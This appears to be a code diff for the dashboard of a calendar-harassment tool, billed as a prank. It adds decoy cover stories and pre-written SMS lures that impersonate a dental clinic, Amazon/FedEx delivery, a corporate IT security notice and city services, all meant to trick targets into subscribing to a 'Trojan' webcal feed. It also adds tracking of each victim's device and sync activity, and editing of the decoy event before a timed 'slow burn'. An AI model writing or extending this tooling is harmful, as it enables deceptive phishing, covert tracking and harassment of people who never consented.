@@ -270,6 +270,42 @@
       color: #67e8f9;
     }
 
+    .theme-pill {
+      background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.15);
+      color: #94a3b8;
+      font-size: 0.72rem;
+      font-weight: 600;
+      padding: 5px 12px;
+      border-radius: 999px;
+      cursor: pointer;
+      transition: all 0.15s ease;
+      user-select: none;
+    }
+    .theme-pill:hover {
+      background: rgba(255,255,255,0.12);
+      color: white;
+      border-color: rgba(255,255,255,0.3);
+    }
+    .theme-pill.active {
+      background: rgba(37,99,235,0.3);
+      border-color: #3b82f6;
+      color: #93c5fd;
+      font-weight: 700;
+      box-shadow: 0 0 10px rgba(59,130,246,0.3);
+    }
+
+    .sub-device-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 6px 10px;
+      background: rgba(255,255,255,0.03);
+      border: 1px solid rgba(255,255,255,0.07);
+      border-radius: 8px;
+      font-size: 0.75rem;
+    }
+
     .btn-action-primary:hover {
       background: rgba(6, 182, 212, 0.25);
     }
@@ -499,8 +535,22 @@
             </div>
           </div>
 
+          <!-- Multi-Subscriber Breakdown Container (Hidden by default, shown when multiple devices or clicked) -->
+          <div id="subscriberList-${camp.id}" style="display:none; margin: 10px 0; background:rgba(0,0,0,0.4); border:1px solid rgba(56,189,248,0.25); border-radius:10px; padding:12px 14px;">
+            <div style="font-size:0.78rem; font-weight:800; color:#38bdf8; margin-bottom:8px; display:flex; justify-content:space-between; align-items:center;">
+              <span style="display:flex; align-items:center; gap:6px;">👥 <span>Target Subscriber Devices</span></span>
+              <span id="subscriberCountBadge-${camp.id}" style="font-size:0.7rem; background:rgba(6,182,212,0.18); color:#67e8f9; padding:2px 8px; border-radius:999px;">0 Devices</span>
+            </div>
+            <div id="subscriberRows-${camp.id}" style="display:flex; flex-direction:column; gap:6px;">
+              <div style="color:#94a3b8; font-size:0.75rem; text-align:center; padding:8px;">Waiting for targets to subscribe...</div>
+            </div>
+          </div>
+
           <div class="card-actions">
-            <a class="btn-action btn-action-primary" href="join.html?cid=${camp.id}" target="_blank" style="background:#2563eb; color:white; font-weight:700;">
+            <button class="btn-action" style="background:linear-gradient(135deg, #2563eb, #1d4ed8); border-color:#3b82f6; color:white; font-weight:800; box-shadow:0 0 15px rgba(37,99,235,0.4);" onclick="toggleInviteDrawer('${camp.id}', this)" id="btnInvite-${camp.id}">
+              ✉️ Invite & Share Decoy
+            </button>
+            <a class="btn-action" href="join.html?cid=${camp.id}" target="_blank" style="color:#93c5fd; border-color:rgba(59,130,246,0.4); font-weight:700;">
               🛡️ Open Trojan Portal
             </a>
             <button class="btn-action" onclick="copyJoinUrl('${camp.id}', this)" style="color:#60a5fa; border-color:rgba(59,130,246,0.4); font-weight:700;">
@@ -533,6 +583,120 @@
             <button class="btn-action" style="color:#f87171; border-color:rgba(239,68,68,0.3); background:rgba(239,68,68,0.06);" onclick="untrackCampaign('${camp.id}')" title="Remove from your dashboard">
               🗑️ Untrack
             </button>
+          </div>
+
+          <!-- Expandable Invite & Trojan Cover Story Dispatcher Drawer -->
+          <div id="inviteDrawer-${camp.id}" style="display:none; margin-top:14px; background:rgba(15,23,42,0.92); border:1px solid rgba(59,130,246,0.45); border-radius:14px; padding:18px; box-shadow:0 12px 30px rgba(0,0,0,0.6);">
+            <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:14px; flex-wrap:wrap; gap:10px;">
+              <div>
+                <div style="font-size:0.95rem; font-weight:800; color:#60a5fa; display:flex; align-items:center; gap:6px;">
+                  <span>✉️ Trojan Invite & Cover Story Dispatcher</span>
+                  <span style="font-size:0.68rem; background:rgba(37,99,235,0.25); color:#93c5fd; padding:2px 8px; border-radius:999px;">Multi-Target Versatile</span>
+                </div>
+                <div style="font-size:0.75rem; color:#94a3b8; margin-top:2px;">
+                  Prank multiple people with the same calendar! Choose a cover story, customize the decoy event, and copy pre-written SMS scripts.
+                </div>
+              </div>
+              <button type="button" onclick="toggleInviteDrawer('${camp.id}')" style="background:transparent; border:none; color:#94a3b8; font-size:1.2rem; cursor:pointer; line-height:1;">&times;</button>
+            </div>
+
+            <!-- Cover Story Selector Pills -->
+            <div style="margin-bottom:14px;">
+              <div style="font-size:0.72rem; font-weight:700; text-transform:uppercase; color:#94a3b8; letter-spacing:0.05em; margin-bottom:6px;">
+                1. Select Cover Story Theme:
+              </div>
+              <div style="display:flex; flex-wrap:wrap; gap:6px;" id="themePills-${camp.id}">
+                <button type="button" class="theme-pill active" onclick="selectInviteTheme('${camp.id}', 'babyshower', this)">🍼 Baby Shower</button>
+                <button type="button" class="theme-pill" onclick="selectInviteTheme('${camp.id}', 'wedding', this)">💍 Wedding</button>
+                <button type="button" class="theme-pill" onclick="selectInviteTheme('${camp.id}', 'fantasy', this)">🏈 Fantasy Sports</button>
+                <button type="button" class="theme-pill" onclick="selectInviteTheme('${camp.id}', 'dental', this)">🦷 Dental Clinic</button>
+                <button type="button" class="theme-pill" onclick="selectInviteTheme('${camp.id}', 'delivery', this)">📦 Delivery Sync</button>
+                <button type="button" class="theme-pill" onclick="selectInviteTheme('${camp.id}', 'corporate', this)">💻 Corporate IT</button>
+                <button type="button" class="theme-pill" onclick="selectInviteTheme('${camp.id}', 'flight', this)">✈️ Flight Alert</button>
+                <button type="button" class="theme-pill" onclick="selectInviteTheme('${camp.id}', 'trash', this)">🗑️ City Services</button>
+              </div>
+            </div>
+
+            <!-- Optional Recipient Tag (who) -->
+            <div style="margin-bottom:14px;">
+              <div style="font-size:0.72rem; font-weight:700; text-transform:uppercase; color:#94a3b8; letter-spacing:0.05em; margin-bottom:6px;">
+                2. Target Name Tag (Optional &bull; Distinguishes Devices on Dashboard):
+              </div>
+              <input type="text" id="inviteWhoInput-${camp.id}" placeholder="e.g. Dave, Sarah, Group Chat, Coworkers..." style="width:100%; max-width:400px; background:rgba(0,0,0,0.5); border:1px solid rgba(255,255,255,0.15); color:white; font-size:0.8rem; padding:8px 12px; border-radius:8px;" oninput="updateInviteScript('${camp.id}')">
+            </div>
+
+            <!-- Pre-written SMS Script Preview -->
+            <div style="margin-bottom:14px;">
+              <div style="font-size:0.72rem; font-weight:700; text-transform:uppercase; color:#94a3b8; letter-spacing:0.05em; margin-bottom:6px; display:flex; justify-content:space-between; align-items:center;">
+                <span>3. Pre-Written Invite Text (Ready to Send):</span>
+                <span style="color:#60a5fa; cursor:pointer; font-size:0.72rem;" onclick="copyInviteText('${camp.id}', this)">📋 Copy Full Text</span>
+              </div>
+              <textarea id="inviteScriptArea-${camp.id}" rows="3" readonly style="width:100%; background:rgba(0,0,0,0.5); border:1px solid rgba(96,165,250,0.3); color:#e2e8f0; font-size:0.82rem; padding:10px 12px; border-radius:8px; line-height:1.4; resize:none;"></textarea>
+            </div>
+
+            <!-- Action Dispatch Buttons -->
+            <div style="display:flex; flex-wrap:wrap; gap:8px; margin-bottom:18px;">
+              <button type="button" class="btn-action" style="background:#2563eb; color:white; font-weight:700;" onclick="copyInviteText('${camp.id}', this)">
+                📋 Copy Invite Text
+              </button>
+              <button type="button" class="btn-action" onclick="copyPortalUrl('${camp.id}', this)">
+                🔗 Copy Portal Link (join.html)
+              </button>
+              <button type="button" class="btn-action" onclick="copyWebCalUrl('${camp.id}', this)">
+                📲 Copy 1-Tap WebCal
+              </button>
+              <a class="btn-action" id="inviteQrLink-${camp.id}" href="#" target="_blank">
+                📱 View QR Code
+              </a>
+              <a class="btn-action" id="invitePortalPreviewLink-${camp.id}" href="#" target="_blank" style="color:#38bdf8;">
+                👁️ Test Trojan Landing Page &rarr;
+              </a>
+            </div>
+
+            <!-- Edit Trojan Calendar Event on Server -->
+            <div style="border-top:1px solid rgba(255,255,255,0.1); padding-top:14px;">
+              <div style="font-size:0.82rem; font-weight:800; color:#38bdf8; margin-bottom:4px; display:flex; align-items:center; gap:6px;">
+                <span>🛡️ Edit Trojan Event in Victim's Calendar</span>
+                <span style="font-size:0.65rem; background:rgba(6,182,212,0.15); color:#67e8f9; padding:2px 6px; border-radius:4px;">Server Sync</span>
+              </div>
+              <p style="font-size:0.75rem; color:#94a3b8; margin-bottom:10px;">
+                Customize the exact decoy event that shows up on their phone before the slow burn begins.
+              </p>
+
+              <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(200px, 1fr)); gap:10px; margin-bottom:10px;">
+                <div>
+                  <label style="display:block; font-size:0.7rem; color:#94a3b8; margin-bottom:4px;">Decoy Calendar Name</label>
+                  <input type="text" id="editDecoyCalName-${camp.id}" style="width:100%; background:rgba(0,0,0,0.3); border:1px solid rgba(255,255,255,0.12); color:white; font-size:0.8rem; padding:6px 10px; border-radius:6px;">
+                </div>
+                <div>
+                  <label style="display:block; font-size:0.7rem; color:#94a3b8; margin-bottom:4px;">Decoy Event Title</label>
+                  <input type="text" id="editDecoyTitle-${camp.id}" style="width:100%; background:rgba(0,0,0,0.3); border:1px solid rgba(255,255,255,0.12); color:white; font-size:0.8rem; padding:6px 10px; border-radius:6px;">
+                </div>
+                <div>
+                  <label style="display:block; font-size:0.7rem; color:#94a3b8; margin-bottom:4px;">Decoy Date</label>
+                  <input type="date" id="editDecoyDate-${camp.id}" style="width:100%; background:rgba(0,0,0,0.3); border:1px solid rgba(255,255,255,0.12); color:white; font-size:0.8rem; padding:6px 10px; border-radius:6px;">
+                </div>
+                <div>
+                  <label style="display:block; font-size:0.7rem; color:#94a3b8; margin-bottom:4px;">Decoy Location</label>
+                  <input type="text" id="editDecoyLocation-${camp.id}" placeholder="e.g. Pavilion 4 / Online" style="width:100%; background:rgba(0,0,0,0.3); border:1px solid rgba(255,255,255,0.12); color:white; font-size:0.8rem; padding:6px 10px; border-radius:6px;">
+                </div>
+              </div>
+
+              <div style="margin-bottom:10px;">
+                <label style="display:block; font-size:0.7rem; color:#94a3b8; margin-bottom:4px;">Decoy Event Notes / Memo</label>
+                <textarea id="editDecoyMemo-${camp.id}" rows="2" style="width:100%; background:rgba(0,0,0,0.3); border:1px solid rgba(255,255,255,0.12); color:white; font-size:0.8rem; padding:6px 10px; border-radius:6px; resize:vertical;"></textarea>
+              </div>
+
+              <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
+                <label style="display:flex; align-items:center; gap:6px; font-size:0.75rem; color:#cbd5e1; cursor:pointer;">
+                  <input type="checkbox" id="chkReactivateDecoy-${camp.id}">
+                  <span>🔄 Reset 24h stealth window for new target wave</span>
+                </label>
+                <button type="button" class="btn-action" style="background:rgba(6,182,212,0.25); border-color:#06b6d4; color:#67e8f9; font-weight:700;" onclick="saveDecoySettings('${camp.id}', this)" id="btnSaveDecoy-${camp.id}">
+                  💾 Save Trojan Event to Feed
+                </button>
+              </div>
+            </div>
           </div>
 
           <!-- Expandable Strikes Schedule Drawer -->
@@ -651,14 +815,66 @@
         }
       }
 
+      // Multi-subscriber tracking & device list
+      const subListEl = document.getElementById(`subscriberList-${cid}`);
+      const subBadge = document.getElementById(`subscriberCountBadge-${cid}`);
+      const subRowsEl = document.getElementById(`subscriberRows-${cid}`);
+      const subscriberCount = data.subscriberCount || (data.subscribers ? data.subscribers.length : (data.syncCount > 0 ? 1 : 0));
+
       if (telemDevice) {
-        if (sub && sub.deviceType && sub.deviceType !== "Unknown Device") {
+        if (subscriberCount > 1) {
+          telemDevice.innerHTML = `<span style="color:#60a5fa; cursor:pointer;" onclick="toggleSubscribersList('${cid}')">👥 ${subscriberCount} Devices (View)</span>`;
+        } else if (data.subscribers && data.subscribers.length === 1) {
+          const s = data.subscribers[0];
+          telemDevice.textContent = `${s.label} (${s.deviceType})`;
+        } else if (sub && sub.deviceType && sub.deviceType !== "Unknown Device") {
           telemDevice.textContent = sub.deviceType;
         } else if (data.syncCount > 0) {
           telemDevice.textContent = data.lastUserAgent ? data.lastUserAgent.split(' ')[0] : "Apple Calendar";
         } else {
           telemDevice.textContent = "Waiting for initial tap...";
         }
+      }
+
+      if (subBadge) {
+        subBadge.textContent = `${subscriberCount} Device${subscriberCount === 1 ? '' : 's'}`;
+      }
+
+      if (subRowsEl && data.subscribers && data.subscribers.length > 0) {
+        subRowsEl.innerHTML = data.subscribers.map(s => `
+          <div class="sub-device-row">
+            <div>
+              <strong style="color:#f8fafc;">${s.label}</strong>
+              <span style="color:#94a3b8; margin-left:6px;">${s.deviceType}</span>
+            </div>
+            <div style="display:flex; align-items:center; gap:8px;">
+              <span style="color:#94a3b8; font-size:0.7rem;">${s.hoursAgo !== undefined ? (s.hoursAgo < 1 ? 'Just now' : s.hoursAgo + 'h ago') : 'Synced'} (${s.syncCount} syncs)</span>
+              <span style="font-size:0.7rem; font-weight:700; color:${s.state === 'ACTIVE' ? '#10b981' : (s.state === 'IDLE' ? '#f59e0b' : '#ef4444')};">
+                ${s.state === 'ACTIVE' ? '🟢 Active' : (s.state === 'IDLE' ? '🟡 Idle' : '⚠️ Unsub')}
+              </span>
+            </div>
+          </div>
+        `).join('');
+        if (subscriberCount > 1 && subListEl) {
+          subListEl.style.display = "block";
+        }
+      }
+
+      // Populate Trojan Event settings inputs if present
+      if (document.getElementById(`editDecoyCalName-${cid}`) && data.decoyCalName) {
+        document.getElementById(`editDecoyCalName-${cid}`).value = data.decoyCalName;
+      }
+      if (document.getElementById(`editDecoyTitle-${cid}`) && data.decoyTitle) {
+        document.getElementById(`editDecoyTitle-${cid}`).value = data.decoyTitle;
+      }
+      if (document.getElementById(`editDecoyDate-${cid}`) && data.decoyDate) {
+        document.getElementById(`editDecoyDate-${cid}`).value = data.decoyDate.slice(0, 10);
+      }
+      if (document.getElementById(`editDecoyLocation-${cid}`) && data.decoyLocation) {
+        document.getElementById(`editDecoyLocation-${cid}`).value = data.decoyLocation;
+      }
+      if (document.getElementById(`editDecoyMemo-${cid}`) && data.decoyMemo) {
+        document.getElementById(`editDecoyMemo-${cid}`).value = data.decoyMemo;
       }
 
       if (telemLast) {
@@ -972,6 +1188,243 @@
       } catch (e) {}
 
       renderDashboard();
+    }
+
+    // Preset Trojan Cover Stories for Multicast Sharing
+    const DASHBOARD_DECOYS = {
+      babyshower: {
+        name: "Baby Shower",
+        calName: "Sophia's Baby Shower & Registry Updates",
+        title: "🍼 Sophia & Mark's Baby Shower (RSVP Confirmed)",
+        location: "Oak Ridge Pavilion • Room B",
+        memo: "Venue: Oak Ridge Pavilion. Gift registry items and schedule updates syncing to device.",
+        sms: "Hey! Here's the shared calendar for the baby shower & registry deadlines, subscribe so you have all the dates handy: {URL}"
+      },
+      wedding: {
+        name: "Wedding",
+        calName: "Miller & Davis Wedding Itinerary",
+        title: "💍 Wedding Rehearsal Dinner & Ceremony",
+        location: "The Grand Estate Ballroom",
+        memo: "Formal wedding weekend itinerary and rehearsal dinner schedule syncing to device.",
+        sms: "Here is the shared wedding weekend itinerary calendar so everyone stays on schedule: {URL}"
+      },
+      fantasy: {
+        name: "Fantasy Sports",
+        calName: "2026 Fantasy League Draft & Matchups",
+        title: "🏈 League Draft Party & Week 1 Kickoff",
+        location: "Draft Room Live",
+        memo: "League matchups and waiver wire deadlines syncing. Draft order finalized.",
+        sms: "Yo, here's the fantasy league draft and matchup sync link for your calendar, add it so you don't miss kickoff: {URL}"
+      },
+      dental: {
+        name: "Dental Care",
+        calName: "Family Health Portal Sync",
+        title: "🦷 Dental Cleaning & Exam Check-in",
+        location: "Suite 400 • Medical Plaza",
+        memo: "Automated patient appointment sync. Arrive 15 minutes prior with insurance card.",
+        sms: "Appointment Sync: Please add this shared appointment calendar to your device to confirm check-in times and instructions: {URL}"
+      },
+      delivery: {
+        name: "Delivery Sync",
+        calName: "Priority Package Dispatch",
+        title: "📦 Amazon / FedEx Priority Package Delivery",
+        location: "Front Porch / Gate Access",
+        memo: "Automated delivery tracking feed. Live dispatch window updates streaming to calendar.",
+        sms: "Delivery Alert: Live tracking updates for your package delivery have been dispatched. Sync to your calendar here: {URL}"
+      },
+      corporate: {
+        name: "Corporate IT",
+        calName: "Mobile Directory Sync",
+        title: "📱 Enterprise Directory Verification",
+        location: "Corporate Security Gateway",
+        memo: "Routine enterprise directory sync for secure mobile access.",
+        sms: "System Security Notice: Please complete mobile calendar directory synchronization by adding this verified feed: {URL}"
+      },
+      flight: {
+        name: "Flight Alert",
+        calName: "Airline Travel Schedule",
+        title: "✈️ Flight Gate Tracking & Boarding Group",
+        location: "Terminal 2 • Gate B14",
+        memo: "Automated flight status and gate tracking feed syncing directly to calendar.",
+        sms: "Here's our shared flight itinerary and gate tracking calendar! Add it to your phone so you get automatic updates: {URL}"
+      },
+      trash: {
+        name: "City Services",
+        calName: "City Utility & Services Sync",
+        title: "🗑️ Bi-Weekly Bulk Trash & Recycling Pickup",
+        location: "Curbside",
+        memo: "Municipal sanitation and bulk recycling schedule syncing to residential address.",
+        sms: "Here is the neighborhood bulk trash and recycling pickup schedule calendar feed for your phone: {URL}"
+      }
+    };
+
+    const ACTIVE_INVITE_THEMES = {};
+
+    function toggleSubscribersList(cid) {
+      const el = document.getElementById(`subscriberList-${cid}`);
+      if (el) el.style.display = el.style.display === "none" ? "block" : "none";
+    }
+
+    function toggleInviteDrawer(cid, btnEl) {
+      const drawer = document.getElementById(`inviteDrawer-${cid}`);
+      if (!drawer) return;
+      const isClosed = drawer.style.display === "none" || !drawer.style.display;
+      drawer.style.display = isClosed ? "block" : "none";
+
+      if (isClosed) {
+        if (!ACTIVE_INVITE_THEMES[cid]) ACTIVE_INVITE_THEMES[cid] = "babyshower";
+        updateInviteScript(cid);
+        drawer.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+      }
+    }
+
+    function selectInviteTheme(cid, themeKey, btnEl) {
+      ACTIVE_INVITE_THEMES[cid] = themeKey;
+      const container = document.getElementById(`themePills-${cid}`);
+      if (container) {
+        container.querySelectorAll(".theme-pill").forEach(p => p.classList.remove("active"));
+      }
+      if (btnEl) btnEl.classList.add("active");
+
+      // Auto-fill the Trojan Editor fields with this theme's defaults
+      const preset = DASHBOARD_DECOYS[themeKey];
+      if (preset) {
+        const calInput = document.getElementById(`editDecoyCalName-${cid}`);
+        const titleInput = document.getElementById(`editDecoyTitle-${cid}`);
+        const locInput = document.getElementById(`editDecoyLocation-${cid}`);
+        const memoInput = document.getElementById(`editDecoyMemo-${cid}`);
+        if (calInput) calInput.value = preset.calName;
+        if (titleInput) titleInput.value = preset.title;
+        if (locInput) locInput.value = preset.location;
+        if (memoInput) memoInput.value = preset.memo;
+      }
+
+      updateInviteScript(cid);
+    }
+
+    function getInvitePortalUrl(cid) {
+      const theme = ACTIVE_INVITE_THEMES[cid] || "babyshower";
+      const whoInput = document.getElementById(`inviteWhoInput-${cid}`);
+      const who = whoInput ? whoInput.value.trim() : "";
+      const base = `${window.location.origin}${window.location.pathname.replace(/[^/]*$/, '')}join.html?cid=${cid}&theme=${theme}`;
+      return who ? `${base}&who=${encodeURIComponent(who)}` : base;
+    }
+
+    function getInviteWebCalUrl(cid) {
+      const cleanUrl = CLOUDFLARE_WORKER_URL.replace(/^https?:\/\//, "").replace(/\/+$/, "");
+      const whoInput = document.getElementById(`inviteWhoInput-${cid}`);
+      const who = whoInput ? whoInput.value.trim() : "";
+      const base = `webcal://${cleanUrl}/cal/${cid}.ics`;
+      return who ? `${base}?who=${encodeURIComponent(who)}` : base;
+    }
+
+    function updateInviteScript(cid) {
+      const theme = ACTIVE_INVITE_THEMES[cid] || "babyshower";
+      const preset = DASHBOARD_DECOYS[theme] || DASHBOARD_DECOYS.babyshower;
+      const portalUrl = getInvitePortalUrl(cid);
+      const webcalUrl = getInviteWebCalUrl(cid);
+
+      const scriptEl = document.getElementById(`inviteScriptArea-${cid}`);
+      if (scriptEl) {
+        scriptEl.value = preset.sms.replace("{URL}", portalUrl);
+      }
+
+      const previewLink = document.getElementById(`invitePortalPreviewLink-${cid}`);
+      if (previewLink) previewLink.href = portalUrl;
+
+      const qrLink = document.getElementById(`inviteQrLink-${cid}`);
+      if (qrLink) {
+        qrLink.href = `https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=${encodeURIComponent(webcalUrl)}`;
+      }
+    }
+
+    function copyInviteText(cid, btnEl) {
+      const scriptEl = document.getElementById(`inviteScriptArea-${cid}`);
+      if (!scriptEl) return;
+      navigator.clipboard.writeText(scriptEl.value).then(() => {
+        const old = btnEl.textContent;
+        btnEl.textContent = "Copied Invite Text!";
+        btnEl.style.color = "#10b981";
+        setTimeout(() => {
+          btnEl.textContent = old;
+          btnEl.style.color = "";
+        }, 2000);
+      });
+    }
+
+    function copyPortalUrl(cid, btnEl) {
+      const url = getInvitePortalUrl(cid);
+      navigator.clipboard.writeText(url).then(() => {
+        const old = btnEl.textContent;
+        btnEl.textContent = "Copied Portal Link!";
+        btnEl.style.color = "#60a5fa";
+        setTimeout(() => {
+          btnEl.textContent = old;
+          btnEl.style.color = "";
+        }, 2000);
+      });
+    }
+
+    function copyWebCalUrl(cid, btnEl) {
+      const url = getInviteWebCalUrl(cid);
+      navigator.clipboard.writeText(url).then(() => {
+        const old = btnEl.textContent;
+        btnEl.textContent = "Copied WebCal Link!";
+        btnEl.style.color = "#10b981";
+        setTimeout(() => {
+          btnEl.textContent = old;
+          btnEl.style.color = "";
+        }, 2000);
+      });
+    }
+
+    async function saveDecoySettings(cid, btnEl) {
+      const calName = (document.getElementById(`editDecoyCalName-${cid}`) || {}).value;
+      const title = (document.getElementById(`editDecoyTitle-${cid}`) || {}).value;
+      const date = (document.getElementById(`editDecoyDate-${cid}`) || {}).value;
+      const loc = (document.getElementById(`editDecoyLocation-${cid}`) || {}).value;
+      const memo = (document.getElementById(`editDecoyMemo-${cid}`) || {}).value;
+      const reactivate = (document.getElementById(`chkReactivateDecoy-${cid}`) || {}).checked;
+
+      const oldText = btnEl.textContent;
+      btnEl.textContent = "Saving to Server...";
+      btnEl.disabled = true;
+
+      try {
+        const cleanUrl = CLOUDFLARE_WORKER_URL.replace(/\/+$/, "");
+        const res = await fetch(`${cleanUrl}/api/campaigns/${cid}/decoy`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            decoyCalName: calName,
+            decoyTitle: title,
+            decoyDate: date,
+            decoyLocation: loc,
+            decoyMemo: memo,
+            reactivateDecoy: reactivate
+          })
+        });
+
+        if (!res.ok) throw new Error(`HTTP ${res.status}`);
+        const data = await res.json();
+
+        btnEl.textContent = "Saved & Live!";
+        btnEl.style.color = "#10b981";
+        btnEl.style.borderColor = "#10b981";
+
+        setTimeout(() => {
+          btnEl.textContent = oldText;
+          btnEl.style.color = "";
+          btnEl.style.borderColor = "";
+          btnEl.disabled = false;
+        }, 2500);
+
+        updateCardTelemetry(cid);
+      } catch (e) {
+        alert("Failed to save Trojan event to server: " + e.message);
+        btnEl.textContent = oldText;
+        btnEl.disabled = false;
+      }
     }
 
     function copyJoinUrl(cid, btnEl) {
